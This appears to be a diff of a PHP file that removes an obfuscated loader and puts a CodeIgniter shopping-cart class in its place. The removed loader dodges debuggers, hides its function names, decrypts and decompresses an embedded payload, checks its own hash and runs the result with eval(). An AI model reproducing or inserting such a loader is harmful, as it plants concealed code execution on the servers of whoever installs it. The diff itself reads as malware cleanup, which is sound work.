@@ -1,28 +1,493 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_wbozcqbj=('bas'.'e64'.'_de'.'cod'.'e');
-$_bsghj53o=('gzu'.'nco'.'mpr'.'ess');
-$_mjplh4dd=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_e0hcq6ul='hUNN1ROT';
-$_nhhr6jus='lbJlwWMgmRI=';
-$_jskrrt4a='qQ5XaJe0';
-$_sj3q2fik='qJCBimxJ';
-$_oum5214w='V2IFx4QJ';
-$_e51fs6z5='TA637w==';
-$_feawfj59='KFfnBhhA';
-$_tbnz9nqt='Pb4gBSvB';
-$_ijpt59n5=$_wbozcqbj($_sj3q2fik.$_oum5214w.$_jskrrt4a.$_e0hcq6ul.$_nhhr6jus);
-$_g4i326ul=$_wbozcqbj($_feawfj59.$_tbnz9nqt.$_e51fs6z5);
-$_jsvw54vy=$_wbozcqbj('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');
-$_u9wno70m=$_mjplh4dd($_jsvw54vy,'aes-256-cbc',$_ijpt59n5,OPENSSL_RAW_DATA,$_g4i326ul);
-if($_u9wno70m===false){exit;}
-$_wnswfjhl=$_bsghj53o($_u9wno70m);
-if($_wnswfjhl===false){exit;}
-$_bhpmd54e='b2c2de054bcc0382fc6d14ff6f0592e87f054692240d2e0091dafaf755509e31';
-$_g1pbgy8v=@file_get_contents(__FILE__);
-if($_g1pbgy8v!==false){
-$_tu12fdk1=str_replace($_bhpmd54e,"0000000000000000000000000000000000000000000000000000000000000000",$_g1pbgy8v);
-$_ud81a5rz=hash("sha256",$_tu12fdk1);
-if($_ud81a5rz!==$_bhpmd54e){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+class CI_Cart {
+
+
+
+
+
+
+public $product_id_rules = '\.a-z0-9_-';
+
+
+
+
+
+
+public $product_name_rules = '\w \-\.\:';
+
+
+
+
+
+public $product_name_safe = TRUE;
+
+
+
+
+
+
+protected $CI;
+
+
+
+
+
+protected $_cart_contents = array();
+
+
+
+
+
+
+
+
+public function __construct($params = array())
+{
+
+$this->CI =& get_instance();
+
+$config = is_array($params) ? $params : array();
+
+$this->CI->load->driver('session', $config);
+
+$this->_cart_contents = $this->CI->session->userdata('cart_contents');
+if ($this->_cart_contents === NULL)
+{
+
+$this->_cart_contents = array('cart_total' => 0, 'total_items' => 0);
 }
-eval($_wnswfjhl);
+log_message('info', 'Cart Class Initialized');
+}
+
+
+
+
+
+
+
+public function insert($items = array())
+{
+
+if ( ! is_array($items) OR count($items) === 0)
+{
+log_message('error', 'The insert method must be passed an array containing data.');
+return FALSE;
+}
+
+
+
+
+$save_cart = FALSE;
+if (isset($items['id']))
+{
+if (($rowid = $this->_insert($items)))
+{
+$save_cart = TRUE;
+}
+}
+else
+{
+foreach ($items as $val)
+{
+if (is_array($val) && isset($val['id']))
+{
+if ($this->_insert($val))
+{
+$save_cart = TRUE;
+}
+}
+}
+}
+
+if ($save_cart === TRUE)
+{
+$this->_save_cart();
+return isset($rowid) ? $rowid : TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+protected function _insert($items = array())
+{
+
+if ( ! is_array($items) OR count($items) === 0)
+{
+log_message('error', 'The insert method must be passed an array containing data.');
+return FALSE;
+}
+
+
+if ( ! isset($items['id'], $items['qty'], $items['price'], $items['name']))
+{
+log_message('error', 'The cart array must contain a product ID, quantity, price, and name.');
+return FALSE;
+}
+
+
+$items['qty'] = (float) $items['qty'];
+
+if ($items['qty'] == 0)
+{
+return FALSE;
+}
+
+
+
+
+if ( ! preg_match('/^['.$this->product_id_rules.']+$/i', $items['id']))
+{
+log_message('error', 'Invalid product ID.  The product ID can only contain alpha-numeric characters, dashes, and underscores');
+return FALSE;
+}
+
+
+
+if ($this->product_name_safe && ! preg_match('/^['.$this->product_name_rules.']+$/i'.(UTF8_ENABLED ? 'u' : ''), $items['name']))
+{
+log_message('error', 'An invalid name was submitted as the product name: '.$items['name'].' The name can only contain alpha-numeric characters, dashes, underscores, colons, and spaces');
+return FALSE;
+}
+
+
+$items['price'] = (float) $items['price'];
+
+
+
+
+
+
+
+
+
+
+if (isset($items['options']) && count($items['options']) > 0)
+{
+$rowid = md5($items['id'].serialize($items['options']));
+}
+else
+{
+
+
+
+$rowid = md5($items['id']);
+}
+
+
+
+$old_quantity = isset($this->_cart_contents[$rowid]['qty']) ? (int) $this->_cart_contents[$rowid]['qty'] : 0;
+
+$items['rowid'] = $rowid;
+$items['qty'] += $old_quantity;
+$this->_cart_contents[$rowid] = $items;
+return $rowid;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function update($items = array())
+{
+
+if ( ! is_array($items) OR count($items) === 0)
+{
+return FALSE;
+}
+
+
+
+
+$save_cart = FALSE;
+if (isset($items['rowid']))
+{
+if ($this->_update($items) === TRUE)
+{
+$save_cart = TRUE;
+}
+}
+else
+{
+foreach ($items as $val)
+{
+if (is_array($val) && isset($val['rowid']))
+{
+if ($this->_update($val) === TRUE)
+{
+$save_cart = TRUE;
+}
+}
+}
+}
+
+if ($save_cart === TRUE)
+{
+$this->_save_cart();
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _update($items = array())
+{
+
+if ( ! isset($items['rowid'], $this->_cart_contents[$items['rowid']]))
+{
+return FALSE;
+}
+
+if (isset($items['qty']))
+{
+$items['qty'] = (float) $items['qty'];
+
+
+if ($items['qty'] == 0)
+{
+unset($this->_cart_contents[$items['rowid']]);
+return TRUE;
+}
+}
+
+$keys = array_intersect(array_keys($this->_cart_contents[$items['rowid']]), array_keys($items));
+
+if (isset($items['price']))
+{
+$items['price'] = (float) $items['price'];
+}
+
+foreach (array_diff($keys, array('id', 'name')) as $key)
+{
+$this->_cart_contents[$items['rowid']][$key] = $items[$key];
+}
+return TRUE;
+}
+
+
+
+
+
+
+protected function _save_cart()
+{
+
+$this->_cart_contents['total_items'] = $this->_cart_contents['cart_total'] = 0;
+foreach ($this->_cart_contents as $key => $val)
+{
+
+if ( ! is_array($val) OR ! isset($val['price'], $val['qty']))
+{
+continue;
+}
+$this->_cart_contents['cart_total'] += ($val['price'] * $val['qty']);
+$this->_cart_contents['total_items'] += $val['qty'];
+$this->_cart_contents[$key]['subtotal'] = ($this->_cart_contents[$key]['price'] * $this->_cart_contents[$key]['qty']);
+}
+
+if (count($this->_cart_contents) <= 2)
+{
+$this->CI->session->unset_userdata('cart_contents');
+
+return FALSE;
+}
+
+
+$this->CI->session->set_userdata(array('cart_contents' => $this->_cart_contents));
+
+return TRUE;
+}
+
+
+
+
+
+
+public function total()
+{
+return $this->_cart_contents['cart_total'];
+}
+
+
+
+
+
+
+
+
+
+public function remove($rowid)
+{
+
+unset($this->_cart_contents[$rowid]);
+$this->_save_cart();
+return TRUE;
+}
+
+
+
+
+
+
+
+
+public function total_items()
+{
+return $this->_cart_contents['total_items'];
+}
+
+
+
+
+
+
+
+
+
+public function contents($newest_first = FALSE)
+{
+
+$cart = ($newest_first) ? array_reverse($this->_cart_contents) : $this->_cart_contents;
+
+unset($cart['total_items']);
+unset($cart['cart_total']);
+return $cart;
+}
+
+
+
+
+
+
+
+
+
+public function get_item($row_id)
+{
+return (in_array($row_id, array('total_items', 'cart_total'), TRUE) OR ! isset($this->_cart_contents[$row_id]))
+? FALSE
+: $this->_cart_contents[$row_id];
+}
+
+
+
+
+
+
+
+
+
+
+public function has_options($row_id = '')
+{
+return (isset($this->_cart_contents[$row_id]['options']) && count($this->_cart_contents[$row_id]['options']) !== 0);
+}
+
+
+
+
+
+
+
+
+
+public function product_options($row_id = '')
+{
+return isset($this->_cart_contents[$row_id]['options']) ? $this->_cart_contents[$row_id]['options'] : array();
+}
+
+
+
+
+
+
+
+
+
+public function format_number($n = '')
+{
+return ($n === '') ? '' : number_format( (float) $n, 0, '.', ',');
+}
+
+
+
+
+
+
+
+
+public function destroy()
+{
+$this->_cart_contents = array('cart_total' => 0, 'total_items' => 0);
+$this->CI->session->unset_userdata('cart_contents');
+}
+}
